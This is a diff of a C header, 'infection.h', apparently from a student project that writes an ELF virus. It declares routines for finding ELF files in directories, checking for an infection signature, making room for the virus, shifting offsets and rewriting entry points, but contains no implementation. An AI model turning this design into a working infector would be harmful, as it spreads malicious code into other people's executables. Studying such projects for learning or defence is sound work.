@@ -1,9 +1,20 @@
+/* ************************************************************************** */
+/*                                                                            */
+/*                                                        :::      ::::::::   */
+/*   infection.h                                        :+:      :+:    :+:   */
+/*                                                    +:+ +:+         +:+     */
+/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
+/*                                                +#+#+#+#+#+   +#+           */
+/*   Created: 2020/02/29 18:22:53 by plamtenz          #+#    #+#             */
+/*   Updated: 2020/02/29 18:22:53 by plamtenz         ###   ########.fr       */
+/*                                                                            */
+/* ************************************************************************** */
+
 #ifndef INFECTION_H
 # define INFECTION_H
 
 #include "elf.h"
 
-/*
 # include <stdlib.h>
 # include <unistd.h>
 # include <fcntl.h>
@@ -13,7 +24,6 @@
 # include <string.h>
 # include <stdio.h>
 # include <sys/mman.h>
-*/
 
 #define _GNU_SOURCE //GNU lib gives acces to useful macros
 
@@ -30,8 +40,6 @@ struct                      linux_dirent_x64
     unsigned char           d_type;     /* File type */
     char                    d_name[];   /* filename */
 };
-
-
 
 /*
 **      --> UTILS AND FILE PARSE METHODS
@@ -50,8 +58,6 @@ char                        **get_elf_files(char **files, char *dir_path, int ty
 char                        check_header_sanity(char *map, int size);
 char                        infect_folder_entry_point(char *self_name, const char *path);
 char                        infect_all_targets(char *argv);
-
-
 
 /*
 **      -> ENTRY POINT INFECTION
@@ -74,7 +80,7 @@ typedef struct              s_entry
 void                        find_text_section(t_entry *entry);
 void                        find_entry_point(t_entry  *entry);
 char                        is_not_infected(t_entry *entry, uint64_t signature);
-char                        room_manager(t_entry *entry, uint64_t signature);
+char                        room_manager(t_entry *entry, uint32_t virus_size, uint64_t signature);
 char                        shift_offsets(t_entry *entry);
 char                        infection_entry_point(t_entry *entry, uint64_t signature, uint32_t virus_size, const char *path);
 char                        write_entry_point_infection(t_entry *entry, uint32_t siganture, uint32_t virus);
